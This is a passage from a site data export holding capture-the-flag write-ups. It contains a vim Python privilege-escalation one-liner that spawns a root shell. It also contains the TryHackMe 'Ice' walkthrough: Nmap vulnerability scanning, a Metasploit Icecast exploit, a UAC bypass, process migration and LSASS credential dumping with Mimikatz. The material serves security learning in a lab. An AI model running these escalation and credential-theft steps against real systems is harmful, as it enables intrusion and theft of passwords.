target=&quot;_blank&quot;&gt;GTFOBins suggests that this can lead to a privilege escalation if ViM is compiled with Python…&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; And, indeed, running &lt;code&gt;vim.basic --version&lt;/code&gt; reveals that this is the case.&lt;/p&gt;\n&lt;p&gt;Adapting the escape from GTFOBins for the present case gives us:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;vim.basic&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:py3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;And this indeed gives us root! With this new power, we can enter the second user’s home directory and read pass.bak for our final flag.&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 3 h 19 min&lt;/p&gt;","rssInclude":true},"journals/2021-12-07":{"slug":"journals/2021-12-07","filePath":"journals/2021-12-07.md","title":"Ice","links":["spells/ping","spells/Nmap","spells/meterpreter","spells/Mimikatz","spells/Hydra","spells/John-the-Ripper","spells/Kerberos"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Ice” on TryHackMe\n\n\n\nRecon\nThe machine we’ll be attacking is at 10.10.55.173. Since it’s a Windows box, we know that it won’t respond to ping by default.\nAs usual, we’ll start out with an Nmap scan:\nsudo nmap -v -oA ice -Pn -A -T4 -sS -script vuln \\\n          -p- 10.10.55.173\nWhich gives us:\n# Nmap 7.92 scan initiated Tue Dec  7 20:55:44 2021 as: nmap -v -oA ice -Pn -A -T4 -sS -script vuln -p- 10.10.55.173\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nIncreasing send delay for 10.10.55.173 from 0 to 5 due to 387 out of 967 dropped probes since last increase.\nIncreasing send delay for 10.10.55.173 from 5 to 10 due to 48 out of 119 dropped probes since last increase.\nNmap scan report for 10.10.55.173\nHost is up (0.18s latency).\nNot shown: 65523 closed tcp ports (reset)\nPORT      STATE SERVICE            VERSION\n135/tcp   open  msrpc              Microsoft Windows RPC\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n3389/tcp  open  ssl/ms-wbt-server?\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n| rdp-vuln-ms12-020: \n|   VULNERABLE:\n|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2012-0152\n|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)\n|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.\n|           \n|     Disclosure date: 2012-03-13\n|     References:\n|       technet.microsoft.com/en-us/security/bulletin/ms12-020\n|       cve.mitre.org/cgi-bin/cvename.cgi\n|   \n|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2012-0002\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.\n|           \n|     Disclosure date: 2012-03-13\n|     References:\n|       technet.microsoft.com/en-us/security/bulletin/ms12-020\n|_      cve.mitre.org/cgi-bin/cvename.cgi\n5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n8000/tcp  open  http               Icecast streaming media server\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-iis-webdav-vuln: Could not determine vulnerability, since root folder is password protected\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#039;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       ha.ckers.org/slowloris/\n|_      cve.mitre.org/cgi-bin/cvename.cgi\n49152/tcp open  msrpc              Microsoft Windows RPC\n49153/tcp open  msrpc              Microsoft Windows RPC\n49154/tcp open  msrpc              Microsoft Windows RPC\n49158/tcp open  msrpc              Microsoft Windows RPC\n49159/tcp open  msrpc              Microsoft Windows RPC\n49160/tcp open  msrpc              Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=12/7%OT=135%CT=1%CU=42453%PV=Y%DS=4%DC=T%G=Y%TM=61B035\nOS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS\nOS:=7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M\nOS:506NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20\nOS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y\nOS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD\nOS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0\nOS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1\nOS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI\nOS:=N%T=80%CD=Z)\n\nUptime guess: 0.035 days (since Tue Dec  7 20:41:59 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=255 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|       blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_      cve.mitre.org/cgi-bin/cvename.cgi\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT       ADDRESS\n1   34.62 ms  10.13.0.1\n2   ... 3\n4   179.31 ms 10.10.55.173\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Tue Dec  7 21:31:59 2021 -- 1 IP address (1 host up) scanned in 2174.84 seconds\n\n(An interesting effect of the -T4 flag, which uses a slightly more aggressive timing timing profile, is that port discovery seems to happen out-of-order…)\nGain access\nThe next few flags are about finding a particular vulnerability for Icecast on cvedetails.com. There’s actually a couple of different vulnerabilities that match the flag descriptions, but after a little trial-and-error we can find the right one.\nThere’s not too much to the corresponding Metasploit module — set RHOSTS and LHOST, run, get shell.\nEscalate\nWe can find the current user using the getuid command. The sysinfo command will give us the OS version and architecture.\nWith that out of the way, we can use run post/multi/recon/local_exploit_suggester to find potential paths to elevating privileges.\nUnfortunately, for me this only returns one result — exploit/windows/local/ms10_092_schelevator — which is not accepted as the 12th flag. The flag hint states that the exploit will contain eventvwr. A quick search through Metasploit shows that the only exploit including this string is exploit/windows/local/bypassuac_eventvwr, which is accepted.\nWe can background meterpreter with Ctrl+Z and then switch to this exploit using use exploit/windows/local/bypassuac_eventvwr. This exploit runs through an existing session, so we need to set this using set SESSION 2. (I’m on session 2 because I previously backed out an unsuccessfully tried to pop a 64-bit meterpreter shell — I guess Icecast is running as a 32-bit process.)\nI also tweaked LPORT, as I’m nervous about killing the existing session (which is running on the default port, 4444).\nUsing run quickly pops a new shell.\nLooting\nIn order to harvest credentials from LSASS we’ll need to migrate meterpreter to a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS. The print spooler service is a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically.\nmigrate -N spoolsv.exe\nWe’re going to loot LSASS now using Mimikatz.\nload kiwi\nIt turns out that Windows loads unhashed passwords into LSASS for any users with scheduled jobs!\nPast-exploitation\nHashes dumped using hashdump can be cracked offline using Hydra or John the Ripper. It can be helpful to know a little about Kerberos tickets at this point\nElapsed Time: 2 h 39 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/ice&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Ice” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#recon&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The machine we’ll be attacking is at 10.10.55.173. Since it’s a Windows box, we know that it won’t respond to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/ping&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ping&quot;&gt;ping&lt;/a&gt; by default.&lt;/p&gt;\n&lt;p&gt;As usual, we’ll start out with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ice&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.55.173&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Which gives us:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Tue Dec  7 20:55:44 2021 as: nmap -v -oA ice -Pn -A -T4 -sS -script vuln -p- 10.10.55.173\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nIncreasing send delay for 10.10.55.173 from 0 to 5 due to 387 out of 967 dropped probes since last increase.\nIncreasing send delay for 10.10.55.173 from 5 to 10 due to 48 out of 119 dropped probes since last increase.\nNmap scan report for 10.10.55.173\nHost is up (0.18s latency).\nNot shown: 65523 closed tcp ports (reset)\nPORT      STATE SERVICE            VERSION\n135/tcp   open  msrpc              Microsoft Windows RPC\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n3389/tcp  open  ssl/ms-wbt-server?\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n| rdp-vuln-ms12-020: \n|   VULNERABLE:\n|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2012-0152\n|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)\n|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.\n|           \n|     Disclosure date: 2012-03-13\n|     References:\n|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152\n|   \n|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2012-0002\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.\n|           \n|     Disclosure date: 2012-03-13\n|     References:\n|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002\n5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n8000/tcp  open  http               Icecast streaming media server\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-iis-webdav-vuln: Could not determine vulnerability, since root folder is password protected\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#039;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n49152/tcp open  msrpc              Microsoft Windows RPC\n49153/tcp open  msrpc              Microsoft Windows RPC\n49154/tcp open  msrpc              Microsoft Windows RPC\n49158/tcp open  msrpc              Microsoft Windows RPC\n49159/tcp open  msrpc              Microsoft Windows RPC\n49160/tcp open  msrpc              Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=12/7%OT=135%CT=1%CU=42453%PV=Y%DS=4%DC=T%G=Y%TM=61B035\nOS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS\nOS:=7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M\nOS:506NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20\nOS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y\nOS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD\nOS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0\nOS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1\nOS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI\nOS:=N%T=80%CD=Z)\n\nUptime guess: 0.035 days (since Tue Dec  7 20:41:59 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=255 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT       ADDRESS\n1   34.62 ms  10.13.0.1\n2   ... 3\n4   179.31 ms 10.10.55.173\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Dec  7 21:31:59 2021 -- 1 IP address (1 host up) scanned in 2174.84 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;(An interesting effect of the -T4 flag, which uses a slightly more aggressive timing timing profile, is that port discovery seems to happen out-of-order…)&lt;/p&gt;\n&lt;h2 id=&quot;gain-access&quot;&gt;Gain access&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#gain-access&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The next few flags are about finding a particular vulnerability for Icecast on &lt;a href=&quot;https://cvedetails.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://cvedetails.com&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. There’s actually a couple of different vulnerabilities that match the flag descriptions, but after a little trial-and-error we can find the &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2004-1561/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;right one&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;There’s not too much to the corresponding Metasploit module — set RHOSTS and LHOST, run, get shell.&lt;/p&gt;\n&lt;h2 id=&quot;escalate&quot;&gt;Escalate&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#escalate&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;We can find the current user using the getuid command. The sysinfo command will give us the OS version and architecture.&lt;/p&gt;\n&lt;p&gt;With that out of the way, we can use &lt;code&gt;run post/multi/recon/local_exploit_suggester&lt;/code&gt; to find potential paths to elevating privileges.&lt;/p&gt;\n&lt;p&gt;Unfortunately, for me this only returns one result — &lt;code&gt;exploit/windows/local/ms10_092_schelevator&lt;/code&gt; — which is not accepted as the 12th flag. The flag hint states that the exploit will contain eventvwr. A quick search through Metasploit shows that the only exploit including this string is &lt;code&gt;exploit/windows/local/bypassuac_eventvwr&lt;/code&gt;, which &lt;em&gt;is&lt;/em&gt; accepted.&lt;/p&gt;\n&lt;p&gt;We can background &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; with Ctrl+Z and then switch to this exploit using &lt;code&gt;use exploit/windows/local/bypassuac_eventvwr&lt;/code&gt;. This exploit runs through an existing session, so we need to set this using &lt;code&gt;set SESSION 2&lt;/code&gt;. (I’m on session 2 because I previously backed out an unsuccessfully tried to pop a 64-bit &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; shell — I guess Icecast is running as a 32-bit process.)&lt;/p&gt;\n&lt;p&gt;I also tweaked LPORT, as I’m nervous about killing the existing session (which is running on the default port, 4444).&lt;/p&gt;\n&lt;p&gt;Using &lt;code&gt;run&lt;/code&gt; quickly pops a new shell.&lt;/p&gt;\n&lt;h2 id=&quot;looting&quot;&gt;Looting&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#looting&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;In order to harvest credentials from LSASS we’ll need to migrate &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; to a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS. The print spooler service is a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;migrate -N spoolsv.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;We’re 